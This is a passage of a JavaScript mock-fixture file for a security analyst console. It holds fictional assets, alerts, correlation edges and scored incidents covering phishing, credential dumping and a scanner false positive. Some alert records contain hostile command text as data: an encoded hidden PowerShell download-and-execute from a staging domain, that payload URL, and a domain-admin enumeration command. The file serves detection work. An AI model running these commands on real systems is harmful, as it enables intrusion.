/* AEGIS analyst console — mock fixtures.
 *
 * Every object here matches docs/api-contract.md exactly, so the console can be
 * exercised end-to-end without the FastAPI process running. Mock mode is entered
 * when the page is opened with ?mock=1 or when the first fetch fails with a
 * network error (see the `api` layer in app.js). The data below is a miniature
 * corpus: three multi-alert incidents (one clear intrusion, one lateral-movement
 * case on a domain controller, one vendor-CRITICAL scanner false positive) plus
 * three single-alert incidents so the "hide single-alert incidents" toggle has
 * something to hide.
 *
 * Nothing in app.js reads this file directly except the Mock adapter; if the
 * real API changes shape, fix the adapter, not the views.
 */
(function () {
  'use strict';

  // ---------------------------------------------------------------------------
  // Assets (AssetRef)
  // ---------------------------------------------------------------------------
  const FIN_WS_042 = { asset_id: 'FIN-WS-042', hostname: 'fin-ws-042.corp.local', ip: '10.20.7.42', subnet: '10.20.7.0/24', user_principal: 'm.okafor', criticality: 4 };
  const HR_WS_011 = { asset_id: 'HR-WS-011', hostname: 'hr-ws-011.corp.local', ip: '10.20.4.11', subnet: '10.20.4.0/24', user_principal: 'j.varga', criticality: 2 };
  const DC01 = { asset_id: 'DC01', hostname: 'dc01.corp.local', ip: '10.20.0.5', subnet: '10.20.0.0/24', user_principal: 'j.varga', criticality: 5 };
  const HR_WS_022 = { asset_id: 'HR-WS-022', hostname: 'hr-ws-022.corp.local', ip: '10.20.4.22', subnet: '10.20.4.0/24', user_principal: null, criticality: 2 };
  const VPN_GW_01 = { asset_id: 'VPN-GW-01', hostname: 'vpn-gw-01.corp.local', ip: '10.20.0.40', subnet: '10.20.0.0/24', user_principal: 'a.reyes', criticality: 3 };
  const ENG_WS_118 = { asset_id: 'ENG-WS-118', hostname: 'eng-ws-118.corp.local', ip: '10.20.9.118', subnet: '10.20.9.0/24', user_principal: 'e.tan', criticality: 2 };
  const BKP_SRV_02 = { asset_id: 'BKP-SRV-02', hostname: 'bkp-srv-02.corp.local', ip: '10.20.0.61', subnet: '10.20.0.0/24', user_principal: 'svc-backup', criticality: 4 };

  // ---------------------------------------------------------------------------
  // Technique mappings (TechniqueMapping) — reused across alerts and chains
  // ---------------------------------------------------------------------------
  const T = {
    phish: { technique_id: 'T1566.001', technique_name: 'Spearphishing Attachment', tactic: 'initial-access', score: 0.87, method: 'blended' },
    malfile: { technique_id: 'T1204.002', technique_name: 'User Execution: Malicious File', tactic: 'execution', score: 0.61, method: 'embedding' },
    ps: { technique_id: 'T1059.001', technique_name: 'PowerShell', tactic: 'execution', score: 0.91, method: 'blended' },
    obf: { technique_id: 'T1027', technique_name: 'Obfuscated Files or Information', tactic: 'defense-evasion', score: 0.58, method: 'keyword' },
    schtask: { technique_id: 'T1053.005', technique_name: 'Scheduled Task', tactic: 'persistence', score: 0.84, method: 'blended' },
    dnsc2: { technique_id: 'T1071.004', technique_name: 'Application Layer Protocol: DNS', tactic: 'command-and-control', score: 0.79, method: 'blended' },
    dynres: { technique_id: 'T1568', technique_name: 'Dynamic Resolution', tactic: 'command-and-control', score: 0.41, method: 'embedding' },
    webc2: { technique_id: 'T1071.001', technique_name: 'Application Layer Protocol: Web Protocols', tactic: 'command-and-control', score: 0.66, method: 'blended' },
    exfilc2: { technique_id: 'T1041', technique_name: 'Exfiltration Over C2 Channel', tactic: 'exfiltration', score: 0.52, method: 'embedding' },
    lsass: { technique_id: 'T1003.001', technique_name: 'OS Credential Dumping: LSASS Memory', tactic: 'credential-access', score: 0.88, method: 'blended' },
    pth: { technique_id: 'T1550.002', technique_name: 'Use Alternate Authentication Material: Pass the Hash', tactic: 'lateral-movement', score: 0.74, method: 'blended' },
    domacct: { technique_id: 'T1078.002', technique_name: 'Valid Accounts: Domain Accounts', tactic: 'defense-evasion', score: 0.62, method: 'embedding' },
    enum: { technique_id: 'T1087.002', technique_name: 'Account Discovery: Domain Account', tactic: 'discovery', score: 0.81, method: 'keyword' },
    scan: { technique_id: 'T1595.001', technique_name: 'Active Scanning: Scanning IP Blocks', tactic: 'reconnaissance', score: 0.83, method: 'blended' },
    netsvc: { technique_id: 'T1046', technique_name: 'Network Service Discovery', tactic: 'discovery', score: 0.71, method: 'embedding' },
    valid: { technique_id: 'T1078', technique_name: 'Valid Accounts', tactic: 'initial-access', score: 0.52, method: 'embedding' },
    usb: { technique_id: 'T1091', technique_name: 'Replication Through Removable Media', tactic: 'initial-access', score: 0.48, method: 'keyword' },
    local: { technique_id: 'T1078.003', technique_name: 'Valid Accounts: Local Accounts', tactic: 'persistence', score: 0.44, method: 'embedding' },
  };
  const withScore = (t, score) => Object.assign({}, t, { score });

  // ---------------------------------------------------------------------------
  // Alerts (AlertView)
  // ---------------------------------------------------------------------------
  const SHA_LURE = 'a3f1c9e2b7d04f6a8c1e5d9b2f7a4c3e6d8b1a0f9e7c5d3b2a1f0e9d8c7b6a5f';
  const SHA_SVC = '7d2e4b91c0f3a6d8e5b2c7f1a4d9e0b3c6f8a1d4e7b0c3f6a9d2e5b8c1f4a7d0';

  const ALERTS = [
    // ---- INC-001: Phishing → PowerShell → C2 on FIN-WS-042 ------------------
    {
      alert_id: 'INTEL-007', source: 'intel', timestamp: '2026-09-13T18:30:00Z',
      source_severity: 'high',
      raw_text: 'CTI-2026-0913 (TLP:AMBER): Campaign GHOSTLEDGER is targeting finance staff in the region with macro-enabled invoice lures. Delivery and staging infrastructure observed at cdn-update-svc[.]net (185.220.101.47, AS64511). Attachment SHA-256 a3f1c9e2b7d04f6a8c1e5d9b2f7a4c3e6d8b1a0f9e7c5d3b2a1f0e9d8c7b6a5f. Post-exploitation uses base64-encoded PowerShell stagers and scheduled-task persistence under the UpdateOrchestrator path. Recommend blocking the domain at the resolver and hunting for the hash.',
      asset: null,
      indicators: [
        { type: 'domain', value: 'cdn-update-svc.net', context: 'Delivery and staging infrastructure observed at cdn-update-svc[.]net' },
        { type: 'ipv4', value: '185.220.101.47', context: '(185.220.101.47, AS64511)' },
        { type: 'sha256', value: SHA_LURE, context: 'Attachment SHA-256 a3f1c9e2…' },
      ],
      techniques: [withScore(T.phish, 0.72), withScore(T.ps, 0.55), withScore(T.schtask, 0.49)],
      raw_payload: { report_id: 'CTI-2026-0913', tlp: 'AMBER', author: 'Regional Fusion Cell', published: '2026-09-13T18:30:00Z', campaign: 'GHOSTLEDGER', body_chars: 512 },
      incident_id: 'INC-001',
    },
    {
      alert_id: 'SIEM-0042', source: 'siem', timestamp: '2026-09-14T09:14:07Z',
      source_severity: 'high',
      raw_text: "Email gateway: attachment 'Q3_Invoice_Adjustment.xlsm' delivered to m.okafor@corp.local from billing@acme-invoicing.com; macro-enabled document, sandbox verdict SUSPICIOUS, SHA-256 a3f1c9e2b7d04f6a8c1e5d9b2f7a4c3e6d8b1a0f9e7c5d3b2a1f0e9d8c7b6a5f. Opened on FIN-WS-042.",
      asset: FIN_WS_042,
      indicators: [
        { type: 'email', value: 'billing@acme-invoicing.com', context: 'sender' },
        { type: 'email', value: 'm.okafor@corp.local', context: 'recipient' },
        { type: 'sha256', value: SHA_LURE, context: 'attachment.sha256' },
        { type: 'user', value: 'm.okafor', context: 'user' },
        { type: 'hostname', value: 'fin-ws-042', context: 'host' },
      ],
      techniques: [T.phish, T.malfile],
      raw_payload: { event_id: 'evt-8813204', rule: 'MAIL-ATTACH-MACRO-SUSPICIOUS', severity: 'high', product: 'Proofpoint TAP', sender: 'billing@acme-invoicing.com', recipient: 'm.okafor@corp.local', attachment: { name: 'Q3_Invoice_Adjustment.xlsm', sha256: SHA_LURE, sandbox: 'SUSPICIOUS' }, host: 'FIN-WS-042', '@timestamp': '2026-09-14T09:14:07Z' },
      incident_id: 'INC-001',
    },
    {
      alert_id: 'SYS-1187', source: 'syslog', timestamp: '2026-09-14T09:18:33Z',
      source_severity: 'warning',
      raw_text: 'EDR: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... spawned by EXCEL.EXE (pid 4412) as CORP\\m.okafor on fin-ws-042; decoded command downloads hxxps://cdn-update-svc[.]net/ps/a.ps1 and invokes it in memory.',
      asset: FIN_WS_042,
      indicators: [
        { type: 'domain', value: 'cdn-update-svc.net', context: 'decoded download URL' },
        { type: 'url', value: 'https://cdn-update-svc.net/ps/a.ps1', context: 'decoded command' },
        { type: 'user', value: 'm.okafor', context: 'as CORP\\m.okafor' },
        { type: 'hostname', value: 'fin-ws-042', context: 'on fin-ws-042' },
      ],
      techniques: [T.ps, T.obf, withScore(T.malfile, 0.47)],
      raw_payload: { pri: 132, facility: 'local0', severity: 'warning', host: 'fin-ws-042', app: 'edr-sensor', procid: 4412, msgid: 'PROC_CREATE', msg: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... parent=EXCEL.EXE user=CORP\\m.okafor' },
      incident_id: 'INC-001',
    },
    {
      alert_id: 'SIEM-0047', source: 'siem', timestamp: '2026-09-14T09:21:10Z',
      source_severity: 'medium',
      raw_text: 'Scheduled task created: \\Microsoft\\Windows\\UpdateOrchestrator\\SvcRefresh runs C:\\Users\\m.okafor\\AppData\\Roaming\\svc.exe (SHA-256 7d2e4b91…) at logon; created by powershell.exe on FIN-WS-042.',
      asset: FIN_WS_042,
      indicators: [
        { type: 'sha256', value: SHA_SVC, context: 'svc.exe' },
        { type: 'user', value: 'm.okafor', context: 'task path' },
        { type: 'hostname', value: 'fin-ws-042', context: 'host' },
      ],
      techniques: [T.schtask, withScore(T.ps, 0.44)],
      raw_payload: { event_id: 'evt-8813377', rule: 'WIN-4698-SCHTASK-CREATE', severity: 'medium', product: 'Windows Security', task_name: '\\Microsoft\\Windows\\UpdateOrchestrator\\SvcRefresh', command: 'C:\\Users\\m.okafor\\AppData\\Roaming\\svc.exe', creator_process: 'powershell.exe', host: 'FIN-WS-042', '@timestamp': '2026-09-14T09:21:10Z' },
      incident_id: 'INC-001',
    },
    {
      alert_id: 'SYS-1203', source: 'syslog', timestamp: '2026-09-14T09:23:48Z',
      source_severity: 'notice',
      raw_text: 'DNS sensor: 214 TXT queries for cdn-update-svc.net from 10.20.7.42 in 5 min (avg interval 1.4 s, fixed-length labels); resolves to 185.220.101.47. Pattern consistent with DNS beaconing.',
      asset: FIN_WS_042,
      indicators: [
        { type: 'domain', value: 'cdn-update-svc.net', context: 'queried name' },
        { type: 'ipv4', value: '185.220.101.47', context: 'resolves to' },
        { type: 'ipv4', value: '10.20.7.42', context: 'source' },
      ],
      techniques: [T.dnsc2, T.dynres],
      raw_payload: { pri: 133, facility: 'local0', severity: 'notice', host: 'dns-sensor-01', app: 'zeek-dns', msg: 'beacon-like TXT query pattern src=10.20.7.42 qname=cdn-update-svc.net n=214 window=300s interval_avg=1.4s answer=185.220.101.47' },
      incident_id: 'INC-001',
    },
    {
      alert_id: 'GEO-0311', source: 'geo', timestamp: '2026-09-14T09:41:52Z',
      source_severity: 'P2',
      raw_text: 'Outbound flow 10.20.7.42 → 185.220.101.47:443, 38.4 MB over 17 min; destination geolocated to Ruse, BG (AS64511) on the hostile-region watchlist.',
      asset: FIN_WS_042,
      indicators: [
        { type: 'ipv4', value: '185.220.101.47', context: 'dst_ip' },
        { type: 'ipv4', value: '10.20.7.42', context: 'src_ip' },
      ],
      techniques: [T.webc2, T.exfilc2],
      raw_payload: { flow_id: 'G-0311', src_ip: '10.20.7.42', dst_ip: '185.220.101.47', dst_port: 443, bytes_out: 40265318, duration_s: 1020, dst_country: 'BG', dst_city: 'Ruse', dst_asn: 64511, dst_lat: 43.8564, dst_lon: 25.9708, watchlist: 'hostile-region', priority: 'P2', ts: '2026-09-14T09:41:52Z' },
      incident_id: 'INC-001',
    },

    // ---- INC-002: Credential dumping → pass-the-hash to DC01 ----------------
    {
      alert_id: 'SYS-1240', source: 'syslog', timestamp: '2026-09-14T11:02:15Z',
      source_severity: 'err',
      raw_text: 'Sysmon EID 10: ProcessAccess to lsass.exe GrantedAccess 0x1010 by C:\\Temp\\pd.exe (MD5 5f4dcc3b5aa765d61d8327deb882cf99) as CORP\\j.varga on hr-ws-011.',
      asset: HR_WS_011,
      indicators: [
        { type: 'user', value: 'j.varga', context: 'as CORP\\j.varga' },
        { type: 'hostname', value: 'hr-ws-011', context: 'host' },
        { type: 'md5', value: '5f4dcc3b5aa765d61d8327deb882cf99', context: 'pd.exe' },
      ],
      techniques: [T.lsass],
      raw_payload: { pri: 131, facility: 'local0', severity: 'err', host: 'hr-ws-011', app: 'sysmon', msgid: 'EID10', msg: 'ProcessAccess SourceImage=C:\\Temp\\pd.exe TargetImage=C:\\Windows\\system32\\lsass.exe GrantedAccess=0x1010 User=CORP\\j.varga' },
      incident_id: 'INC-002',
    },
    {
      alert_id: 'SIEM-0061', source: 'siem', timestamp: '2026-09-14T11:09:40Z',
      source_severity: 'high',
      raw_text: 'Windows 4624 LogonType 3 (NTLM) for CORP\\j.varga to DC01 from 10.20.4.11; no prior logon by this principal to DC01 in 90 days. Authentication package NTLM, no Kerberos ticket issued.',
      asset: DC01,
      indicators: [
        { type: 'user', value: 'j.varga', context: 'TargetUserName' },
        { type: 'ipv4', value: '10.20.4.11', context: 'IpAddress' },
        { type: 'hostname', value: 'dc01', context: 'Computer' },
      ],
      techniques: [T.pth, T.domacct],
      raw_payload: { event_id: 'evt-8814902', rule: 'WIN-4624-NTLM-FIRST-SEEN-DC', severity: 'high', product: 'Windows Security', logon_type: 3, auth_package: 'NTLM', target_user: 'CORP\\j.varga', ip: '10.20.4.11', host: 'DC01', '@timestamp': '2026-09-14T11:09:40Z' },
      incident_id: 'INC-002',
    },
    {
      alert_id: 'SIEM-0063', source: 'siem', timestamp: '2026-09-14T11:11:05Z',
      source_severity: 'low',
      raw_text: 'Process net.exe group "Domain Admins" /domain executed on DC01 by CORP\\j.varga (parent cmd.exe).',
      asset: DC01,
      indicators: [
        { type: 'user', value: 'j.varga', context: 'user' },
        { type: 'hostname', value: 'dc01', context: 'host' },
      ],
      techniques: [T.enum],
      raw_payload: { event_id: 'evt-8814951', rule: 'WIN-4688-NET-GROUP-ENUM', severity: 'low', product: 'Windows Security', command_line: 'net group "Domain Admins" /domain', user: 'CORP\\j.varga', host: 'DC01', '@timestamp': '2026-09-14T11:11:05Z' },
      incident_id: 'INC-002',
    },

    // ---- INC-003: vendor-CRITICAL port sweep from the authorised scanner ----
    {
      alert_id: 'SIEM-0088', source: 'siem', timestamp: '2026-09-14T08:12:30Z',
      source_severity: 'critical',
      raw_text: 'IDS: TCP port sweep — 203.0.113.17 probed 1,024 ports on 41 hosts in 10.20.4.0/24 within 90 s (signature ET SCAN Nmap -sS, priority 1).',
      asset: null,
      indicators: [
        { type: 'ipv4', value: '203.0.113.17', context: 'src' },
      ],
      techniques: [T.scan, T.netsvc],
      raw_payload: { event_id: 'evt-8812110', rule: 'ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap -sS)', severity: 'critical', product: 'Suricata', src_ip: '203.0.113.17', dst_net: '10.20.4.0/24', hosts: 41, ports: 1024, window_s: 90, '@timestamp': '2026-09-14T08:12:30Z' },
      incident_id: 'INC-003',
    },
    {
      alert_id: 'SYS-1301', source: 'syslog', timestamp: '2026-09-14T08:12:41Z',
      source_severity: 'warning',
      raw_text: 'FW DENY TCP 203.0.113.17:51234 → 10.20.4.22:445 (rule 118 "block-smb-inbound"); repeated 1,983 times in 60 s.',
      asset: HR_WS_022,
      indicators: [
        { type: 'ipv4', value: '203.0.113.17', context: 'src' },
        { type: 'ipv4', value: '10.20.4.22', context: 'dst' },
      ],
      techniques: [withScore(T.scan, 0.77)],
      raw_payload: { pri: 132, facility: 'local4', severity: 'warning', host: 'fw-edge-01', app: 'pfsense', msg: 'DENY TCP 203.0.113.17:51234 -> 10.20.4.22:445 rule=118 count=1983 window=60s' },
      incident_id: 'INC-003',
    },
    {
      alert_id: 'GEO-0330', source: 'geo', timestamp: '2026-09-14T08:13:05Z',
      source_severity: 'P4',
      raw_text: 'Inbound flows from 203.0.113.17 geolocated to Frankfurt, DE (AS64500 — corp-managed scanner appliance); 2,041 flows/min against 10.20.4.0/24.',
      asset: null,
      indicators: [
        { type: 'ipv4', value: '203.0.113.17', context: 'src_ip' },
      ],
      techniques: [withScore(T.scan, 0.58)],
      raw_payload: { flow_id: 'G-0330', src_ip: '203.0.113.17', dst_net: '10.20.4.0/24', flows_per_min: 2041, src_country: 'DE', src_city: 'Frankfurt', src_asn: 64500, src_lat: 50.1109, src_lon: 8.6821, watchlist: null, priority: 'P4', ts: '2026-09-14T08:13:05Z' },
      incident_id: 'INC-003',
    },

    // ---- Singletons ---------------------------------------------------------
    {
      alert_id: 'GEO-0345', source: 'geo', timestamp: '2026-09-14T10:30:00Z',
      source_severity: 'P3',
      raw_text: 'Impossible travel: a.reyes VPN login from Singapore (SG) at 09:55 UTC; previous login from Ottawa (CA) at 08:40 UTC. Distance 14,700 km in 75 min.',
      asset: VPN_GW_01,
      indicators: [
        { type: 'user', value: 'a.reyes', context: 'user' },
        { type: 'ipv4', value: '116.87.14.203', context: 'src_ip' },
      ],
      techniques: [T.valid],
      raw_payload: { flow_id: 'G-0345', user: 'a.reyes', src_ip: '116.87.14.203', src_country: 'SG', prev_country: 'CA', delta_min: 75, distance_km: 14700, priority: 'P3', ts: '2026-09-14T10:30:00Z' },
      incident_id: 'INC-004',
    },
    {
      alert_id: 'SIEM-0102', source: 'siem', timestamp: '2026-09-14T07:48:12Z',
      source_severity: 'medium',
      raw_text: 'Removable media: USB mass-storage device (VID 0781, SanDisk) mounted on ENG-WS-118 by e.tan; 212 files copied to E:\\.',
      asset: ENG_WS_118,
      indicators: [
        { type: 'user', value: 'e.tan', context: 'user' },
        { type: 'hostname', value: 'eng-ws-118', context: 'host' },
      ],
      techniques: [T.usb],
      raw_payload: { event_id: 'evt-8811620', rule: 'DLP-USB-MOUNT', severity: 'medium', product: 'Endpoint DLP', vid: '0781', vendor: 'SanDisk', files_copied: 212, user: 'e.tan', host: 'ENG-WS-118', '@timestamp': '2026-09-14T07:48:12Z' },
      incident_id: 'INC-005',
    },
    {
      alert_id: 'SYS-1350', source: 'syslog', timestamp: '2026-09-14T12:15:44Z',
      source_severity: 'crit',
      raw_text: 'sudo: 3 incorrect password attempts; user=svc-backup TTY=pts/0 PWD=/var/backups COMMAND=/usr/bin/rsync on bkp-srv-02.',
      asset: BKP_SRV_02,
      indicators: [
        { type: 'user', value: 'svc-backup', context: 'user' },
        { type: 'hostname', value: 'bkp-srv-02', context: 'host' },
      ],
      techniques: [T.local],
      raw_payload: { pri: 34, facility: 'auth', severity: 'crit', host: 'bkp-srv-02', app: 'sudo', msg: 'svc-backup : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/var/backups ; COMMAND=/usr/bin/rsync' },
      incident_id: 'INC-006',
    },
  ];

  // ---------------------------------------------------------------------------
  // Correlation edges (CorrelationEdge) — the evidence trail
  // ---------------------------------------------------------------------------
  const EDGES = {
    'INC-001': [
      { alert_a: 'SIEM-0042', alert_b: 'SYS-1187', total_weight: 0.58, contributions: [
        { signal: 'temporal', weight: 0.18, rationale: '4 min 26 s apart; the temporal decay is 0.92 at this delta.' },
        { signal: 'asset_adjacency', weight: 0.15, rationale: 'Same host FIN-WS-042 and same user principal m.okafor.' },
        { signal: 'tactic_progression', weight: 0.25, rationale: 'initial-access → execution scores 1.00: the canonical first hop, delivery followed by payload execution.' },
      ] },
      { alert_a: 'SYS-1187', alert_b: 'SIEM-0047', total_weight: 0.58, contributions: [
        { signal: 'temporal', weight: 0.19, rationale: '2 min 37 s apart; decay 0.95.' },
        { signal: 'asset_adjacency', weight: 0.15, rationale: 'Same host FIN-WS-042 and same user principal m.okafor.' },
        { signal: 'tactic_progression', weight: 0.24, rationale: 'execution → persistence scores 0.95: payload installs a foothold (scheduled task, run key, service).' },
      ] },
      { alert_a: 'SYS-1187', alert_b: 'SYS-1203', total_weight: 0.88, contributions: [
        { signal: 'shared_indicator', weight: 0.32, rationale: 'Both reference domain cdn-update-svc.net, which appears in only 3 of 487 alerts (IDF 0.81).' },
        { signal: 'temporal', weight: 0.17, rationale: '5 min 15 s apart; decay 0.87.' },
        { signal: 'asset_adjacency', weight: 0.15, rationale: 'Same host FIN-WS-042 (10.20.7.42).' },
        { signal: 'tactic_progression', weight: 0.24, rationale: 'execution → command-and-control scores 0.95: payload executes and beacons; C2 appears before any later stage.' },
      ] },
      { alert_a: 'SYS-1203', alert_b: 'GEO-0311', total_weight: 0.55, contributions: [
        { signal: 'shared_indicator', weight: 0.36, rationale: 'Both reference IPv4 185.220.101.47, which appears in only 3 of 487 alerts (IDF 0.81); shared 10.20.7.42 contributes little (IDF 0.12).' },
        { signal: 'temporal', weight: 0.14, rationale: '18 min apart; decay 0.70.' },
        { signal: 'asset_adjacency', weight: 0.05, rationale: 'Same source IP 10.20.7.42 (geo record carries no hostname).' },
      ] },
      { alert_a: 'SYS-1203', alert_b: 'INTEL-007', total_weight: 0.42, contributions: [
        { signal: 'shared_indicator', weight: 0.40, rationale: 'Both reference cdn-update-svc.net and 185.220.101.47 — two rare indicators (IDF 0.81 each), capped at the signal maximum.' },
        { signal: 'temporal', weight: 0.02, rationale: '14 h 54 min apart; decay 0.08 — the report predates the activity, which is expected for intelligence.' },
      ] },
      { alert_a: 'SIEM-0042', alert_b: 'INTEL-007', total_weight: 0.40, contributions: [
        { signal: 'shared_indicator', weight: 0.38, rationale: 'Both reference SHA-256 a3f1c9e2…, which appears in only 2 of 487 alerts (IDF 0.94) — a shared file hash is near-conclusive.' },
        { signal: 'temporal', weight: 0.02, rationale: '14 h 44 min apart; decay 0.08.' },
      ] },
      { alert_a: 'GEO-0311', alert_b: 'INTEL-007', total_weight: 0.37, contributions: [
        { signal: 'shared_indicator', weight: 0.36, rationale: 'Both reference IPv4 185.220.101.47 (3 of 487 alerts, IDF 0.81).' },
        { signal: 'temporal', weight: 0.01, rationale: '15 h 12 min apart; decay 0.07.' },
      ] },
    ],
    'INC-002': [
      { alert_a: 'SYS-1240', alert_b: 'SIEM-0061', total_weight: 0.86, contributions: [
        { signal: 'shared_indicator', weight: 0.28, rationale: 'Both reference user principal j.varga, which appears in 4 of 487 alerts (IDF 0.71).' },
        { signal: 'temporal', weight: 0.18, rationale: '7 min 25 s apart; decay 0.90.' },
        { signal: 'asset_adjacency', weight: 0.15, rationale: 'Same user principal j.varga; SIEM-0061 source IP 10.20.4.11 is HR-WS-011.' },
        { signal: 'tactic_progression', weight: 0.25, rationale: 'credential-access → lateral-movement scores 1.00: stolen credentials reused against neighbouring hosts.' },
      ] },
      { alert_a: 'SIEM-0061', alert_b: 'SIEM-0063', total_weight: 0.54, contributions: [
        { signal: 'temporal', weight: 0.19, rationale: '1 min 25 s apart; decay 0.97.' },
        { signal: 'asset_adjacency', weight: 0.15, rationale: 'Same host DC01 and same user principal j.varga.' },
        { signal: 'tactic_progression', weight: 0.20, rationale: 'lateral-movement → discovery scores 0.80: re-enumeration on the new host.' },
      ] },
    ],
    'INC-003': [
      { alert_a: 'SIEM-0088', alert_b: 'SYS-1301', total_weight: 0.48, contributions: [
        { signal: 'shared_indicator', weight: 0.22, rationale: 'Both reference IPv4 203.0.113.17, which appears in 38 of 487 alerts (IDF 0.31) — common, so weakly weighted.' },
        { signal: 'temporal', weight: 0.20, rationale: '11 s apart; decay 0.99.' },
        { signal: 'asset_adjacency', weight: 0.06, rationale: 'Both target subnet 10.20.4.0/24.' },
      ] },
      { alert_a: 'SYS-1301', alert_b: 'GEO-0330', total_weight: 0.45, contributions: [
        { signal: 'shared_indicator', weight: 0.22, rationale: 'Both reference IPv4 203.0.113.17 (38 of 487 alerts, IDF 0.31).' },
        { signal: 'temporal', weight: 0.19, rationale: '24 s apart; decay 0.98.' },
        { signal: 'asset_adjacency', weight: 0.04, rationale: 'Both target subnet 10.20.4.0/24.' },
      ] },
      { alert_a: 'SIEM-0088', alert_b: 'GEO-0330', total_weight: 0.42, contributions: [
        { signal: 'shared_indicator', weight: 0.22, rationale: 'Both reference IPv4 203.0.113.17 (38 of 487 alerts, IDF 0.31).' },
        { signal: 'temporal', weight: 0.20, rationale: '35 s apart; decay 0.98.' },
      ] },
    ],
    'INC-004': [], 'INC-005': [], 'INC-006': [],
  };

  // ---------------------------------------------------------------------------
  // Incidents (IncidentSummary + IncidentDetail extras)
  // ---------------------------------------------------------------------------
  const INCIDENTS = [
    {
      incident_id: 'INC-001', rank: 1, title: 'Phishing → PowerShell → C2 on FIN-WS-042',
      alert_count: 6, sources: { siem: 2, syslog: 2, geo: 1, intel: 1 },
      first_seen: '2026-09-13T18:30:00Z', last_seen: '2026-09-14T09:41:52Z',
      assets: ['FIN-WS-042'],
      tactics: ['initial-access', 'execution', 'persistence', 'command-and-control'],
      top_technique: T.ps,
      vendor_severities: { high: 2, medium: 1, warning: 1, notice: 1, P2: 1 },
      score: { correlation_confidence: 0.91, asset_criticality: 0.80, tactic_severity: 0.86, false_positive_likelihood: 0.04, suppression_rules_fired: [], composite: 86 },
      rationale: 'Six alerts from four feeds share three rare indicators and follow initial-access → execution → persistence → C2 on a criticality-4 finance host in 28 minutes.',
      has_bluf: true,
      attack_chain: [
        { technique_id: 'T1566.001', technique_name: 'Spearphishing Attachment', tactic: 'initial-access', score: 0.87, alert_ids: ['SIEM-0042', 'INTEL-007'] },
        { technique_id: 'T1059.001', technique_name: 'PowerShell', tactic: 'execution', score: 0.91, alert_ids: ['SYS-1187'] },
        { technique_id: 'T1053.005', technique_name: 'Scheduled Task', tactic: 'persistence', score: 0.84, alert_ids: ['SIEM-0047'] },
        { technique_id: 'T1071.004', technique_name: 'Application Layer Protocol: DNS', tactic: 'command-and-control', score: 0.79, alert_ids: ['SYS-1203'] },
        { technique_id: 'T1071.001', technique_name: 'Application Layer Protocol: Web Protocols', tactic: 'command-and-control', score: 0.66, alert_ids: ['GEO-0311'] },
      ],
      score_explanation: {
        correlation_confidence: 'Mean edge weight 0.54 across 7 edges; three shared indicators with IDF ≥ 0.81 and a mean top-technique mapping score of 0.80.',
        asset_criticality: 'FIN-WS-042 is inventoried at criticality 4 of 5 (finance workstation with ERP access).',
        tactic_severity: 'Deepest observed tactic is command-and-control (position 12 of 14 in the kill chain).',
        false_positive_likelihood: 'No suppression rule matched; the destination is on the hostile-region watchlist and the hash is in current intelligence.',
      },
    },
    {
      incident_id: 'INC-002', rank: 2, title: 'LSASS dump → pass-the-hash to DC01 by j.varga',
      alert_count: 3, sources: { siem: 2, syslog: 1 },
      first_seen: '2026-09-14T11:02:15Z', last_seen: '2026-09-14T11:11:05Z',
      assets: ['HR-WS-011', 'DC01'],
      tactics: ['credential-access', 'lateral-movement', 'discovery'],
      top_technique: T.lsass,
      vendor_severities: { high: 1, low: 1, err: 1 },
      score: { correlation_confidence: 0.71, asset_criticality: 1.00, tactic_severity: 0.64, false_positive_likelihood: 0.05, suppression_rules_fired: [], composite: 78 },
      rationale: 'Medium-confidence chain, but it reaches the domain controller: LSASS access on HR-WS-011 followed 7 minutes later by a first-ever NTLM logon to DC01 by the same principal.',
      has_bluf: false,
      attack_chain: [
        { technique_id: 'T1003.001', technique_name: 'OS Credential Dumping: LSASS Memory', tactic: 'credential-access', score: 0.88, alert_ids: ['SYS-1240'] },
        { technique_id: 'T1087.002', technique_name: 'Account Discovery: Domain Account', tactic: 'discovery', score: 0.81, alert_ids: ['SIEM-0063'] },
        { technique_id: 'T1550.002', technique_name: 'Use Alternate Authentication Material: Pass the Hash', tactic: 'lateral-movement', score: 0.74, alert_ids: ['SIEM-0061'] },
      ],
      score_explanation: {
        correlation_confidence: 'Mean edge weight 0.70 across 2 edges; only one shared indicator (user principal j.varga, IDF 0.71) — the chain rests on timing and tactic order.',
        asset_criticality: 'DC01 is inventoried at criticality 5 of 5 (domain controller); the maximum across member assets is used.',
        tactic_severity: 'Deepest observed tactic is lateral-movement (position 10 of 14).',
        false_positive_likelihood: 'No suppression rule matched; j.varga is not a service account and DC01 is outside any change window.',
      },
    },
    {
      incident_id: 'INC-004', rank: 3, title: 'Impossible travel for a.reyes on VPN-GW-01',
      alert_count: 1, sources: { geo: 1 },
      first_seen: '2026-09-14T10:30:00Z', last_seen: '2026-09-14T10:30:00Z',
      assets: ['VPN-GW-01'], tactics: ['initial-access'], top_technique: T.valid,
      vendor_severities: { P3: 1 },
      score: { correlation_confidence: 0.30, asset_criticality: 0.60, tactic_severity: 0.21, false_positive_likelihood: 0.20, suppression_rules_fired: [], composite: 34 },
      rationale: 'Single geo alert; plausible credential misuse but nothing corroborates it yet.',
      has_bluf: false,
      attack_chain: [{ technique_id: 'T1078', technique_name: 'Valid Accounts', tactic: 'initial-access', score: 0.52, alert_ids: ['GEO-0345'] }],
      score_explanation: {
        correlation_confidence: 'Single alert, no edges; confidence is the mapping score alone.',
        asset_criticality: 'VPN-GW-01 is inventoried at criticality 3 of 5.',
        tactic_severity: 'Deepest observed tactic is initial-access (position 3 of 14).',
        false_positive_likelihood: 'No suppression rule matched, but impossible-travel alerts have a 20% baseline benign rate (mobile carriers, split tunnels).',
      },
    },
    {
      incident_id: 'INC-005', rank: 4, title: 'USB mass storage mounted on ENG-WS-118',
      alert_count: 1, sources: { siem: 1 },
      first_seen: '2026-09-14T07:48:12Z', last_seen: '2026-09-14T07:48:12Z',
      assets: ['ENG-WS-118'], tactics: ['initial-access'], top_technique: T.usb,
      vendor_severities: { medium: 1 },
      score: { correlation_confidence: 0.24, asset_criticality: 0.40, tactic_severity: 0.21, false_positive_likelihood: 0.35, suppression_rules_fired: [], composite: 22 },
      rationale: 'Single DLP alert on a criticality-2 engineering workstation; no follow-on activity.',
      has_bluf: false,
